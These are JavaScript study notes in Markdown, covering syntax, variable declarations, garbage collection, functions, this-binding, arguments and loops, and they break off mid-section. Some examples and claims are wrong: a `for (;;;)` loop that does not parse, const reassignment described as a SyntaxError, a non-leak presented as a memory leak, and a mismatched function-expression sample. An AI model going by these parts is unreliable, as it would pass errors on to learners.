# INDEX

- [INDEX](#index)
  - [JavaScript](#javascript)
    - [Lexical Structure](#lexical-structure)
    - [ECMA Script (ES)](#ecma-script-es)
    - [Adding javascript file in html](#adding-javascript-file-in-html)
  - [Variables](#variables)
    - [Variable Declaration (`var` vs `const` \& `let`)](#variable-declaration-var-vs-const--let)
    - [Memory Management](#memory-management)
      - [Garbage collection](#garbage-collection)
      - [Memory Leak](#memory-leak)
  - [Function](#function)
    - [Defining functions (Function declaration vs Function expression)](#defining-functions-function-declaration-vs-function-expression)
    - [Invocation Expressions](#invocation-expressions)
    - [Arrow function](#arrow-function)
    - [IIFE](#iife)
    - [Function Constructor](#function-constructor)
    - [Function binding](#function-binding)
      - [Losing "`this`" keyword](#losing-this-keyword)
      - [Solution 1: Wrapper](#solution-1-wrapper)
      - [Solution 2 (better): bind](#solution-2-better-bind)
        - [`bindAll()`](#bindall)
      - [Solution 3 (better): Arrow functions](#solution-3-better-arrow-functions)
    - [Arguments](#arguments)
  - [Iteration \& Loops](#iteration--loops)
    - [Do While Loop](#do-while-loop)
    - [For loop](#for-loop)
    - [For..of loop (looping over iterables)](#forof-loop-looping-over-iterables)
    - [For..in loop (looping over object keys)](#forin-loop-looping-over-object-keys)
    - [For await..of loop (Async Iteration)](#for-awaitof-loop-async-iteration)
  - [Jump Statements](#jump-statements)
  - [Data Structures](#data-structures)
    - [Strings](#strings)
      - [String Methods](#string-methods)
      - [Operations on strings](#operations-on-strings)
      - [Regular expressions (Pattern Matching)](#regular-expressions-pattern-matching)
    - [Arrays](#arrays)
      - [Array Destructuring](#array-destructuring)
      - [Array methods](#array-methods)
        - [Subarrays (`slice` and `splice`)](#subarrays-slice-and-splice)
        - [Flatten and Concatenate Array](#flatten-and-concatenate-array)
        - [Array Data Transformation Methods (`map`, `filter`, `reduce`)](#array-data-transformation-methods-map-filter-reduce)
        - [Array Predicates (`every`, `some`)](#array-predicates-every-some)
        - [Array Sorting](#array-sorting)
    - [Object](#object)
      - [Properties Accessing \& Modification \& Deletion](#properties-accessing--modification--deletion)
      - [Object Methods](#object-methods)
      - [Object.keys, values, entries](#objectkeys-values-entries)
      - [Transforming objects (operations on objects)](#transforming-objects-operations-on-objects)
      - [ES6 Object Features](#es6-object-features)
        - [Shorthand properties \& Methods](#shorthand-properties--methods)
        - [Computed property names](#computed-property-names)
        - [Spread Operator on Objects](#spread-operator-on-objects)
        - [Object Destructuring](#object-destructuring)
        - [Property getter and setter](#property-getter-and-setter)
    - [Sets](#sets)
      - [WeakSet](#weakset)
    - [Maps](#maps)
      - [WeakMap](#weakmap)
  - [Numbers](#numbers)
    - [Math operations](#math-operations)
    - [Special numbers \& Math quirks](#special-numbers--math-quirks)
      - [Math Quirks: Infinity and NaN](#math-quirks-infinity-and-nan)
      - [The Famous Floating-Point Rounding Error](#the-famous-floating-point-rounding-error)
      - [BigInt (Arbitrary Precision Integers)](#bigint-arbitrary-precision-integers)
      - [Numeric Separators](#numeric-separators)
      - [Maximum numbers in JavaScript](#maximum-numbers-in-javascript)
    - [Numbers Internationalization](#numbers-internationalization)
  - [Date](#date)
    - [Operations with Dates](#operations-with-dates)
    - [Dates Internationalization](#dates-internationalization)
    - [Dates Third-party Libraries](#dates-third-party-libraries)
  - [Symbols](#symbols)
  - [Operators \& Expressions](#operators--expressions)
    - [Types of Operators](#types-of-operators)
    - [Operator Precedence](#operator-precedence)
    - [Spread Operator](#spread-operator)
    - [Rest Parameters](#rest-parameters)
    - [Short circuiting - Nullish coalescing operator `??`](#short-circuiting---nullish-coalescing-operator-)
  - [Statements](#statements)
    - [Conditional Statements (`if` - `else`)](#conditional-statements-if---else)
  - [Errors](#errors)
    - [Error object](#error-object)
      - [Custom Errors](#custom-errors)
        - [Extending Error](#extending-error)
    - [Error Handling](#error-handling)
  - [Forms](#forms)
    - [Form Elements](#form-elements)
      - [input and textarea](#input-and-textarea)
      - [select and option](#select-and-option)
    - [event handler in forms](#event-handler-in-forms)
    - [Form Validation](#form-validation)
      - [Focusing: focus/blur](#focusing-focusblur)
      - [Events: change, input, cut, copy, paste](#events-change-input-cut-copy-paste)
    - [FormData API](#formdata-api)
  - [CROSS-SITE SCRIPTING (XSS) ATTACKS](#cross-site-scripting-xss-attacks)
    - [Defending against CROSS-SITE SCRIPTING](#defending-against-cross-site-scripting)
  - [Implementations](#implementations)
    - [Lazy loading](#lazy-loading)
    - [Slider (pagination)](#slider-pagination)
  - [Writing Documentation](#writing-documentation)
  - [Writing Documentation](#writing-documentation-1)

---

## JavaScript

JavaScript is the programming language of the web, meaning the vast majority of websites use it to make pages interactive, It's a **high-level**, **interpreted**, **dynamic**, **single-threaded**, **Object-oriented** programming language. It is **weakly typed** and **dynamically typed** language.

- **high-level** : it provides abstractions that allow us to ignore machine-level details like memory-management.
- **interpreted** : it doesn't need to be compiled, it's executed directly by the browser (line by line);
- **dynamic** : it executes at runtime many common programming behaviors that static programming languages perform during compilation. ex: allocating memory for variables, determining the type of a variable or object, determining the scope of variables, etc.
- **single-threaded** : it means that only one task can be executed at a time.
- **Object-oriented**: it's based on objects, for storing most kinds of data.
- **weakly typed** : it doesn't require us to declare the type of variables. ex: `let x = 5;` or `let x = "John";`
- **dynamically typed** : it means that the type of a variable is checked during runtime rather than in advance. ex: `let x = 5;` or `let x = "John";`
- **Multi-paradigm** : it supports different styles of programming like **procedural programming**, **object-oriented programming**, and **functional programming**.

**Where does JavaScript run?**

- Every programming language needs a "host environment" to do things like input and output. JavaScript has two main environments:
  - Web Browsers: This is the original environment. It allows your code to get input from a user's mouse or keyboard and display output using HTML and CSS.
  - Node.js: This is an environment that lets you run JavaScript completely outside the browser. It gives JavaScript access to your computer's operating system, allowing you to read files or run web servers

---

### Lexical Structure

- **Whitespace**: JavaScript ignores whitespace (spaces, tabs, newlines) except when it separates tokens. For example, `let x = 5;` and `letx=5;` are different because the first has whitespace separating the tokens, while the second does not.
- **Comments**: JavaScript supports single-line comments using `//` and multi-line comments using `/* ... */`. Comments are ignored by the JavaScript engine and are used to explain code or make it more readable.

  ```js
  // This is a single-line comment

  /*
    This is a multi-line comment
    that spans multiple lines
  */
  ```

- **Identifiers**: These are names used to identify variables, functions, and other entities in JavaScript. They must start with a letter, underscore (\_), or dollar sign ($) and can contain letters, digits, underscores, or dollar signs. They can't begin with a digit and can't be a reserved keyword.

  ```js
  let myVariable = 10;
  function myFunction() {
    // ...
  }

  // Invalid identifiers
  let 1stVariable = 5; // starts with a digit
  let my-variable = 5; // contains a hyphen
  let if = 5; // reserved keyword
  ```

- **Case Sensitivity**: JavaScript is case-sensitive, meaning that `myVariable` and `myvariable` are considered different identifiers.

- **Reserved Words**: JavaScript has a set of reserved words that cannot be used as identifiers. These include keywords like `if`, `else`, `while`, `for`, `function`, `return`, and many others.

- **Literals**: These are fixed data values that are directly written in the code. Examples include string literals (`"Hello"`), numeric literals (`42`), boolean literals (`true` or `false`), and object literals (`{ name: "John", age: 30 }`).

  ```js
  let name = 'Alice'; // string literal
  let age = 25; // numeric literal
  let isStudent = true; // boolean literal
  let person = { name: 'Bob', age: 40 }; // object literal
  ```

- **Operators**: These are symbols that perform operations on operands. Examples include arithmetic operators (`+`, `-`, `*`, `/`), assignment operators (`=`, `+=`, `-=`), comparison operators (`==`, `===`, `!=`), and logical operators (`&&`, `||`, `!`).

  ```js
  let a = 5;
  let b = 10;
  let sum = a + b; // sum is 15
  let isEqual = a == b; // isEqual is false
  ```

- **Unicode**: JavaScript source code is written in Unicode, which means it can include characters from many different languages and symbol sets, not just English alphabet.

  ```js
  let greeting = 'こんにちは'; // Japanese for "Hello"
  let emoji = '😊'; // Unicode emoji character
  const π = 3.14; // Using a Unicode character as an identifier
  ```

- **Semicolons**: JavaScript uses semicolons to terminate statements, **but they are optional** in many cases due to a feature called "Automatic Semicolon Insertion (ASI)". However, relying on ASI can lead to unexpected behavior, so it's generally recommended to use semicolons explicitly.

  ```
  let x = 5; // semicolon used
  let y = 10 // semicolon omitted (not recommended)

  // It will be read like this:
  let x = 5; let y = 10;
  ```

  - Note that it can leads to bugs for cases like this:

    ```
    let y = x + f
    (a+b).toString()

    // It will be read like this: (which is not what we want as it will assume that f is a function and it will try to call it with (a+b).toString() as an argument)
    let y = x + f(a+b).toString();


    // ------------------------------------------ //

    function g() {
      return
      true;
    }

    // It will be read like this: (which is not what we want as it will assume that the function returns undefined and the true is just a statement that will never be executed)
    function g() {
      return;
      true;
    }
    ```

---

### ECMA Script (ES)

**ECMAScript** is a standard for scripting languages, It was created to standardize JavaScript to help foster multiple independent implementations. It is the standard that defines what JavaScript is.

![ECMA](./img/ecma-1.png)

- The new versions of ECMAScript is released every year, and they're backward compatible with the previous versions.
  ![ECMA](./img/ecma-2.png)

- How to use modern JavaScript
  ![ECMA](./img/ecma-3.png)

---

### Adding javascript file in html

To add a script to an HTML page, we use the `<script>` tag. The `type` attribute is not required. The `src` attribute is used to include an external script file.

```html
<script src="script.js"></script>
```

- There're 2 ways to include JavaScript in an HTML document:
  - **Inline script**: The script is directly written in the HTML document in the `<script>` tag

    ```html
    <script>
      alert('Hello, World!');
    </script>
    ```

  - **External script**: The script is written in an external file and included in the HTML document.

    ```html
    <script src="script.js"></script>
    ```

- Why use separate `js` file in `<script>` tags
  - The benefit of a separate file is that the browser will download it and store it in its **cache**.
  - Other pages that reference the same script will take it from the cache instead of downloading it, so the file is actually downloaded only once. --> That reduces traffic and makes pages faster.

- A single `<script>` tag can’t have both the **src** attribute and code inside.

  ```html
  <script src="file.js">
    alert(1); // the content is ignored, because src is set
  </script>

  <!-- You can separate the 2 scripts -->
  <script src="file.js"></script>
  <script>
    alert(1);
  </script>
  ```

---

## Variables

- When naming variables, there are some guidelines:
  - must not start with a digit
  - must not be a reserved keyword (like `new`, `class`, ...)
  - uppercase names are for **constants** (variables that should not be changed)

---

### Variable Declaration (`var` vs `const` & `let`)

![var-let-const](./img/var-let-const.png)
![var-let-const](./img/var-let-const-2.jpg)

- **Var**
  Before modern JavaScript (ES6) introduced `let` and `const`, the only way to declare a variable was with the `var` keyword. While it looks exactly like `let` in simple assignments, it behaves very differently and can be a common source of bugs. Here are the three main differences:
  1. **Function Scope instead of Block Scope**:
     Variables declared with `let` and `const` are contained within the block `{}` they are defined in. Variables declared with `var` are scoped to the entire body of the containing function (or global scope if declared outside functions), no matter how deeply nested they are inside loops or `if` statements (i.e., `var` has no block scope).

     ```js
     function f() {
       // It can be accessible anywhere within this function
       var a = 10;
       console.log(a); // 10
     }
     f();

     // "a" cannot be accessed outside of the function
     console.log(a); // ReferenceError: a is not defined

     // ---------------------------------------------------------------

     if (true) {
       // "a" is accessible anywhere outside the if-block because var ignores block scope
       var a = 10;
       console.log(a); // 10
     }
     console.log(a); // 10

     // ---------------------------------------------------------------

     for (var i = 0; i < 10; i++) {
       var one = 1;
     }
     alert(i); // 10, "i" is visible after the loop
     alert(one); // 1, "one" is visible after the loop
     ```

  2. **Global Object Properties**:
     If you declare a global variable with `var` outside of any function, it actually becomes a property of the global object (which you can access via `window` in browsers or `globalThis` / `global` in Node.js). Variables declared with `let` or `const` do not do this.

     ```js
     var x = 5;
     console.log(window.x); // 5
     console.log(globalThis.x); // 5

     let y = 10;
     console.log(window.y); // undefined
     ```

  3. **Hoisting**:
     This is the most unusual feature of `var`. When you declare a variable with `var`, JavaScript lifts (or "hoists") the declaration to the very top of its containing function or global scope. The initialization (the value assignment) stays right where you typed it, but the variable itself exists throughout the entire scope. This means you can use a `var` variable before you assign it a value, and instead of throwing a `ReferenceError`, it will just evaluate to `undefined`.

     ```js
     function sayHi() {
       phrase = 'Hello'; // Assignment works
       alert(phrase); // "Hello"
       var phrase; // Declaration is hoisted to the top
     }
     sayHi();

     // Behind the scenes, the engine processes sayHi like this:
     function sayHi() {
       var phrase; // declaration works at the start...
       alert(phrase); // undefined (if alert runs before assignment)
       phrase = 'Hello'; // ...assignment - when execution reaches it.
     }
     ```
  - Other Quirks of `var`:
    - **Tolerates Re-declarations**:
      Unlike `let` or `const`, a variable declared with `var` can be re-declared in the same scope without triggering an error.

      ```js
      let user;
      let user; // SyntaxError: 'user' has already been declared

      var user = 'Pete';
      var user = 'John'; // this "var" does nothing (already declared), it just re-assigns
      alert(user); // John
      ```

  > 💡 Because of these quirks, there is almost no good reason to use `var` in modern JavaScript. The author advises using `let` and `const` instead, but you must know how `var` works because you will see it constantly in older legacy codebases!

- **let & const** are both function-scoped and block-scoped (anything within `{}`), **means you can't use it outside the function-scope & block-scope**

- `const`
  - A variable declared with `const` must be initialized with a value at the exact moment of declaration, and any attempt to change the value later will throw a `SyntaxError: Assignment to constant variable`
    - Example:

      ```js
      const name; // SyntaxError: Missing initializer in const declaration
      ```

  - It can't be re-assigned a value

    ```js
    const name = 'John';
    name = 'Jane'; // SyntaxError: Assignment to constant variable.
    ```

- `let`
  - A variable declared with `let` can be re-assigned a value
    - Example:

      ```js
      let name = 'John';
      name = 'Jane'; // Ok
      ```

  - A variable declared with `let` can be declared without a value
    - Example:

      ```js
      let name; // Ok
      ```

---

### Memory Management

#### Garbage collection

Javascript has a built-in garbage collector that automatically removes the old, unused objects from memory to free up space.

JavaScript is a garbage collected language. If you allocate memory inside of a function, JavaScript will automatically remove it from the memory heap when the function is done being called.

- Garbage collection is automatic.
- Objects stay in memory while **reachable**.
- Javascript uses algorithm called **Mark-and-sweep**.
  ![mark-and-sweep](./img/mark-and-sweep.gif)
  - Unreachable objects become garbage-collected.
    ![unreachable](./img/unreachable.png)
- Modern engines use advanced garbage collection algorithms.
  - to remove something from memory in garbage-collection, we need to make it **unreachable**, ex:

    ```js
    let john = { name: 'John' };
    // the object can be accessed, john is the reference to it

    // overwrite the reference
    john = null;
    // the object will be removed from memory
    ```

- Some developers have the wrong impression that as Javascript has a garbage collector, they don't need to worry about memory management. But it's not true, you still need to manage memory in JavaScript, because the garbage collector can't collect everything, and it can't collect everything immediately. and you might face some performance issues if you don't manage memory properly like **memory leaks**.
- However, that does not mean you can forget about memory leaks. No system is perfect, so it is important to always remember memory management.

#### Memory Leak

**Memory leak** is a common problem in programming, where the application uses more memory than it should, and it doesn't release the memory that is no longer needed.

- **Causes of memory leaks:**
  - **Global variables**: if you declare a variable in the global scope, it will be available throughout the application, and it will not be garbage collected until the application is closed.
  - **Event listeners**: if you add an event listener to an element, and you don't remove it, it will keep a reference to the element in memory, even if the element is removed from the DOM.
  - **Closures**: if you create a closure inside a function, and you don't remove it, it will keep a reference to the outer function, and it will not be garbage collected.
  - **Timers**: if you create a timer using `setTimeout` or `setInterval`, and you don't clear it, it will keep a reference to the function, and it will not be garbage collected.
  - **DOM elements**: if you create a DOM element using `document.createElement`, and you don't remove it, it will keep a reference to the element, and it will not be garbage collected.

- Example:

  ```js
  var person = {
    first: 'Brittney',
    last: 'Postma'
  };

  person = 'Brittney Postma';
  ```

  - In the example above a memory leak is created. By changing the variable person from an object to a string, it leaves the values of first and last in the memory heap and does not remove it.
  - This can be avoided by trying to keep variables out of the global namespace, only instantiate variables inside of functions when possible.

---

## Function

A function is a named, parameterized block of code that is defined once and can be invoked (run) as many times as needed.

> "parameterized" => it can take parameters/arguments to use as local variables in the function body

- It's a block of code that can be reused and called by name. The code inside a function is executed when the function is invoked.
  ![function](./img/function-1.png)

- when you use a function that do a calculation process, you should put the invocation of this function in a variable and not invoking it many time => **for performance**

- **Default parameters**:
  - If a parameter is not provided, then its value becomes `undefined`.
  - We can set a default value for a parameter if it's not provided.

    ```js
    function showMessage(from, text = 'no text given') {
      alert(from + ': ' + text);
    }

    showMessage('Ann'); // Ann: no text given
    ```

- When a function is assigned to the property of an object, we call it a **method**. Inside a method, the `this` keyword refers to the object the method was called on

---

### Defining functions (Function declaration vs Function expression)

There're 3 ways to define a function:

1. **Function declaration**
2. **Function expression**
3. **Arrow function** (syntactic sugar for function expression)

![function declaration vs function expression](./img/function-declaration-vs-function-expression.png)

- **Function Declarations**:
  - Can be called before they are defined (hoisted).
    - "hoisted" means that the function declaration is moved to the top of the code block it is in, before any other code is executed.
  - Interpreter processes them before executing the script.
  - Instantly fully initialized when the Lexical Environment is created.
    ![function-declaration](./img/function-declaration.png)
  - Example:

    ```js
    console.log('The future says:', future()); // this works! ✅ (even though the function is defined below)

    function future() {
      return "You'll never have flying cars";
    }

    console.log('The future says:', future()); // this also works! ✅
    ```

- **Function Expressions**:
  - Cannot be called before they are defined.
  - Treated as expressions and known as function expressions.
  - Can be anonymous or named which is used for recursion or self-calling.
  - Example:

    ```js
    console.log('The future says:', future()); // Error ❌: future is not a function

    let sayHi = function () {
      alert('Hello');
    };

    console.log('The future says:', future()); // Works ✅
    ```

  - Use named function expressions for recursion or self-calling.

    ```js
    let counter = function count() {
      // ...
      count();
    };
    ```

  - Benefits:
    - Reliable self-reference.
    - More debuggable stack traces.
    - Self-documenting code.

- **Arrow functions**
  - It's a newer, more concise way to write function expressions.
  - It inherits `this` from the outer lexical environment, so it doesn't have its own `this`. unlike function expressions.
  - Example:

    ```js
    let sayHi = () => alert('Hello');
    ```

---

### Invocation Expressions

Calling a function is also called an **invocation expression**. When JavaScript encounters an invocation, it first evaluates the target to ensure it is actually a callable function (throwing a `TypeError` if not), runs the body of the function, and evaluates the expression to the function's return value.

- **Four Ways to Invoke Functions:**
  - The way a function is invoked determines its execution context (the value of the `this` keyword):
  1. **As Functions**: Standard calls like `square(2)`.
     - In `"use strict"`, `this` is `undefined`.
     - In non-strict mode, `this` points to the global object (`window` / `globalThis`).
  2. **As Methods**: Assigned to an object property and called on it (e.g., `calculator.add()`).
     - `this` refers to the object itself (`calculator`).
  3. **As Constructors**: Preceded by the `new` keyword (e.g., `new User()`).
     - Creates a new empty object, binds it to `this`, and returns it when the function ends.
  4. **Indirectly**: Explicitly setting the `this` context using `.call()` or `.apply()` methods.

- **Conditional Invocation (`?.()`)**:
  - Starting from ES2020, you can invoke a function conditionally using the optional chaining operator. If the function doesn't exist, it short-circuits and safely returns `undefined` instead of throwing an error.

  ```js
  function square(x, logFn) {
    // only calls logFn if it exists
    logFn?.(x * x);
    return x * x;
  }
  ```

---

### Arrow function

It's a shorter syntax for writing function expressions. It's a more concise way to write function expressions.

```js
let func = (arg1, arg2) => expression;

// equivalent to
let func = function (arg1, arg2) {
  return expression;
};
```

- if you use declaration block `{}` then you should use the word `return` to return something
- **Arrow functions** have no `this`:
  - They don’t have their `own this`. If we reference `this` from an arrow function, it’s taken from the outer “normal” function.
  - There’s a difference between an `arrow function` => and a regular function called with `.bind(this)`:
    - `.bind(this)` creates a “bound version” of the function.
    - The `arrow =>` doesn’t create any binding. The function simply doesn’t have `this`. The lookup of this is made exactly the same way as a regular variable search: in the outer lexical environment.
  - **The Nested Function `this` Flaw**:
    A regular function nested inside an object method does *not* inherit the method's `this` context (its `this` drops back to `undefined` or the global object).
    - *Old workaround*: Saving `this` to a variable (e.g., `let self = this;`).
    - *Modern fix*: Use an **arrow function** for the nested function, since it automatically inherits `this` from the outer method.

    ```js
    const user = {
      name: 'John',
      greet() {
        // Nested regular function
        function nestedRegular() {
          console.log(this); // undefined (or window) ❌
        }
        nestedRegular();

        // Nested arrow function
        const nestedArrow = () => {
          console.log(this.name); // 'John' ✅ (inherits 'this' from greet)
        };
        nestedArrow();
      }
    };
    ```


- **Limitations:**
  - It's shorter but at a cost of it will be **anonymous function** and not a **named function**, which means that it will need you to read the function body to understand what it does instead of figuring out this from its name
  - It doesn't have `arguments` variable
  - Can’t be called with `new`
  - Doesn’t have `super`

---

### IIFE (Function as Namespace)

> Variables declared inside a function are strictly local to that function and are completely hidden from the outside world. Developers often exploit this to create temporary private namespaces. By defining an anonymous function and immediately invoking it.

**Immediately Invoked Function Expression** (IIFE) is a function that runs as soon as it is defined - It is an inline function expression. which create its own scope

- **It's a simple approach to avoid global scope pollution**
- It's an old approach for creating `modules`

  > In the past, as there was only `var`, and it has no **block-level** visibility, programmers invented a way to emulate it to create a separate scope. where they used IIFE to create a separate scope.

- [ `anonymous function` / `IIFE` ] are **inline function expressions**.

- Ways to create `IIFE`

  ```js
  (function () {
    alert('Parentheses around the function');
  })();

  // with arguments
  (function (message) {
    alert(message);
  })('Hello');

  (function ($) {
    $('h1').css('color', 'red');
  })(jQuery);
  ```

- **Why IIFE ?**:
  - Turns block-scope into functional-scope.
  - Prevents global scope pollution (`var`).
  - Avoids variable name conflicts.
  - Runs code once within a task.
  - Used in:
    - Function arguments
    - Event handlers
    - Preventing conflicts between scripts

- Less common now due to `let` and `const` with block-level scope.

  ```js
  {
    let message = 'Hello';
    alert(message); // Hello
  }

  alert(message); // Error: message is not defined
  ```

---

### Function Constructor

It's a way to create a function using the `Function` constructor.

> **It's not recommended to use it, because it's not safe and it's not efficient.**

```js
const sayHi = new Function('return "Hello"');
alert(sayHi()); // Hello

const sum = new Function('a', 'b', 'return a + b');
alert(sum(1, 2)); // 3
```

- The first pamater is the list of arguments, and the last one is the function body.
  - if there's only one argument, it wll be the function body.

---

### Function binding

When passing object methods as callbacks, there’s a known problem: **"losing "this""**.

> You can find more about `this` keyword here: [this-keyword-in-functions-execution-context](./9-JS_Advanced_concepts.md#this-keyword-in-functions-execution-context)

#### Losing "`this`" keyword

- EX for explanation:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  setTimeout(user.sayHi, 1000); // Hello, undefined!
  ```

  - `setTimeout` separates `sayHi` from `user` object, losing context of `this`. because now the `sayHi` is a function is being called by `setTimeout` and not by `user` object.

    ```js
    let f = user.sayHi;
    setTimeout(f, 1000); // lost user context
    ```

  - `this` becomes `window`, so `this.firstName` is undefined.

  **undefined**.

#### Solution 1: Wrapper

- The simplest solution is to use a **wrapping function**:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  setTimeout(function () {
    user.sayHi(); // Hello, John!
  }, 1000);
  // It works, because it receives "user" from the outer lexical environment, and then calls the method normally.
  ```

- **vulnerability**:
  - What if before `setTimeout` triggers (there’s one second delay!) user changes value? Then, suddenly, it will call the wrong object!

#### Solution 2 (better): bind

- using the built-in method `bind` that allows to fix `this`.

  ```js
  let user = {
    firstName: 'John'
  };

  function func() {
    alert(this.firstName);
  }

  let funcUser = func.bind(user);
  funcUser(); // John
  ```

- following our `setTimeout` example:

  ```js
  let user = {
    firstName: 'John',
    sayHi() {
      alert(`Hello, ${this.firstName}!`);
    }
  };

  let sayHi = user.sayHi.bind(user); // (*)

  // can run it without an object
  sayHi(); // Hello, John!

  setTimeout(sayHi, 1000); // Hello, John!

  // even if the value of user changes within 1 second
  // sayHi uses the pre-bound value which is reference to the old user object
  user = {
    sayHi() {
      alert('Another user in setTimeout!');
    }
  };
  ```

- **Notes:**
  - The `.bind()` method creates a new function
  - The `.bind()` method requires passing value/reference for `this`, so we must put in something like `null`.
  - A function cannot be **re-bound**.

    ```js
    function f() {
      alert(this.name);
    }

    f = f.bind({ name: 'John' }).bind({ name: 'Pete' });
    f(); // John
    ```

##### `bindAll()`

- If an object has many methods and we plan to actively pass it around, then we could bind them all in a loop:

  ```js
  for (let key in user) {
    if (typeof user[key] == 'function') {
      user[key] = user[key].bind(user);
    }
  }
  ```

- or you can use the [\_.bindAll(object, methodNames)](https://lodash.com/docs#bindAll) in **lodash**.

#### Solution 3 (better): Arrow functions

- Arrow functions get the value of `this` from the outer function that **contains** it (where it was created). So it's a good solution for our case. and usually it's used in the case of **callbacks** for **event handlers**.

  ```js
  let func = () => alert(this);
  let func2 = function () {
    alert(this);
  };

  button.addEventListener('click', func); // shows the window object
  button.addEventListener('click', func2); // shows the button object (not usually what we want)
  ```

---

### Arguments

JavaScript is extremely broad-minded about the number of arguments you pass to a function.

- If you pass too many, the extra ones are ignored.
- If you pass too few, the missing parameters get assigned the value **undefined**.

- **The `arguments` keyword**:
  - Special array-like object containing all function arguments by index.
  - Example:

    ```js
    function showName() {
      alert(arguments.length);
      alert(arguments[0]);
      alert(arguments[1]);
    }
    showName('Julius', 'Caesar'); // 2, Julius, Caesar
    ```

  - Before `rest` parameters, `arguments` was used to get all function arguments.
  - Downsides:
    - Not a true array; lacks array methods like `map`.
    - Always contains all arguments; can't capture partially like `rest` parameters.
  - **Arrow functions**:
    - No `arguments` object; inherits from the outer function.

- **Spread syntax**
  - When `...arr` is used in the function call, it “expands” an iterable object arr into the list of arguments.

    ```js
    let arr = [3, 5, 1];

    alert(Math.max(...arr)); // 5 (spread turns array into a list of arguments)
    ```

- `.length` property in functions (`Function.prototype.length`) returns the number of **arguments** specified in the function definition

  ```js
  (function foo(a, b) {}).length; // 2
  ```

---

## Iteration & Loops

| For Loop                                                | While Loop                                                                           | Do While Loop                                                       |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------- |
| Runs a specific number of times, usually with a counter | Runs as long as a condition is true, useful when the number of iterations is unknown | Always runs at least once, even if the condition is false initially |

- Examples

  ```js
  // For loop
  for (let i = 0; i < 3; i++) {
    alert(i); // 0, 1, 2
  }

  // While loop
  let i = 0;
  while (i < 3) {
    alert(i); // 0, 1, 2
    i++;
  }

  // Do While loop
  let i = 0;
  do {
    alert(i); // 0, 1, 2
    i++;
  } while (i < 3);
  ```

- We can also use methods like `forEach` but note that it doesn't support `break` or `continue`.

---

### Do While Loop

- The `do` `while` loop is a control flow statement that allows you to execute a block of code **at least once**, even if the condition is false.
- `do` block executes first then the condition is checked.

  ```js
  let i = 0;
  do {
    alert(i);
    i++;
  } while (i < 3);
  ```

- Because the test happens at the end, the body of the loop will execute **at least once**, even if the condition is false.

```js
// Examples

let num = 0;
do {
  num += 2;
  console.log(num); // 2, 4, 6, 8
} while (num < 7); // condition is checked after the block is executed
```

---

### For loop

It's used when you know the number of iterations.

**Syntax:**

```js
for (initialization; condition; afterthought) {
  statement;
}
```

```js
for (let i = 0; i < 3; i++) {
  alert(i); // 0, 1, 2
}
```

- in `for` block we use `let` and not (`const` or `var`) because:
  - `let` is block-scoped, so it's better to use it in loops
  - `var` is function-scoped, so it's better to avoid it in loops, as it will be available outside the loop
  - `const` is not suitable for loops, as it can't be reassigned

  ```js
  // Using let ✅
  for (let i = 0; i < 3; i++) {
    console.log(i); // 0, 1, 2
  }
  console.log(i); // ReferenceError: i is not defined

  // ----------------------------------------- //

  // Using var ❌
  for (var i = 0; i < 3; i++) {
    console.log(i); // 0, 1, 2
  }
  console.log(i); // 3 (it's available outside the loop because it's function-scoped, unlike let which is block-scoped so it's not available outside the block)

  // ----------------------------------------- //

  // Using const ❌
  for (const i = 0; i < 3; i++) {
    console.log(i); // 0, then error: Assignment to constant variable.
  }
  console.log(i); // ReferenceError: i is not defined
  ```

- Example of `for` loop without any thing in `()` :

  ```javascript
  let p = ['sample1','sample2','sample3','sample4','sample5'];
  let i = 0;

  for (;;;) {
    console.log(p[i]);
    i++;
    if (i === p.length) break;
  }
  ```

> 💡 You can actually leave any of these three expressions blank, but the **two semicolons** inside the parentheses are always strictly required. If you write `for(;;)`, you have created an **infinite loop**!

---

### For..of loop (looping over iterables)

It's a modern way to iterate over **iterables** like (`Array`, `Map`, `Set`, `String`, etc), except `objects` **(Because objects are not iterable by default).**

> "Iterable" simply means the object represents a **sequence or set of elements** that can be **stepped through one by one**.
>
> An **iterator** must have the method named `next()` that returns an object `{done: Boolean, value: any}`, here `done:true` denotes the end of the iteration process, otherwise the value is the next value.

- **Usage with Arrays**:
- It doesn't give access to the index of the current element by default, but in case you need it, you can use the `Array.prototype.entries()` method.

  ```js
  let fruits = ['Apple', 'Orange', 'Plum'];

  for (let fruit of fruits) {
    alert(fruit); // Apple, Orange, Plum
  }

  // with index
  for (let [i, fruit] of fruits.entries()) {
    alert(`${i + 1}: ${fruit}`); // 1: Apple, 2: Orange, 3: Plum
  }
  ```

  - ⚠️ Note that here arrays are iterated **"live"**. This means that if added elements to the array while iterating over it, the loop will behave differently than the `for..in` loop. and might cause an infinite loop.

- **Usage with Strings**:
  - Strings are iterable, so we can use `for..of` loop to iterate over them.

    ```js
    let str = 'Apple';

    for (let char of str) {
      alert(char); // A, p, p, l, e
    }
    ```

- **Usage with Maps**:
  - Maps are iterable, so we can use `for..of` loop to iterate over them. and each element is a **[key, value]** pair. that's why we use `[key, value]` destructuring in the `for..of` loop.

    ```js
    let map = new Map();
    map.set('Apple', 1);
    map.set('Orange', 2);
    map.set('Pear', 3);

    for (let [key, value] of map) {
      alert(`${key}: ${value}`); // Apple: 1, Orange: 2, Pear: 3
    }
    ```

- **Usage with Sets**:
  - Sets are iterable, so we can use `for..of` loop to iterate over them.

    ```js
    let set = new Set();
    set.add('Apple');
    set.add('Orange');
    set.add('Pear');

    for (let value of set) {
      alert(value); // Apple, Orange, Pear
    }
    ```

- **Usage with Objects**:
  - By default, objects are not iterable. That's why we can't use `for..of` loop to iterate over objects.
  - If you try to use `for..of` loop to iterate over objects, you will get a `TypeError: object is not iterable`.
  - If you want to iterate over objects, you can use `Object.keys()` , `Object.values()`, `Object.entries()`, `Symbol.iterator()` methods.

  ```js
  let obj = {
    name: 'John',
    age: 30,
    isAdmin: true
  };

  for (let value of obj) {
    alert(value); // Error: obj is not iterable
  }

  for (let [key, value] of Object.entries(obj)) {
    alert(`${key}: ${value}`); // name: John, age: 30, isAdmin: true
  }

  for (let key of Object.keys(obj)) {
    alert(key); // name, age, isAdmin
  }

  for (let value of Object.values(obj)) {
    alert(value); // John, 30, true
  }
  ```

---

### For..in loop (looping over object keys)

> It was used before ES6 to loop over objects, and now it is recommended to use `Object.keys()` , `Object.values()`, `Object.entries()` methods instead with `for..of` loop.

To walk over all **keys of an object**, there exists a special form of the loop: `for..in`.

```js
let user = {
  name: 'John',
  age: 30,
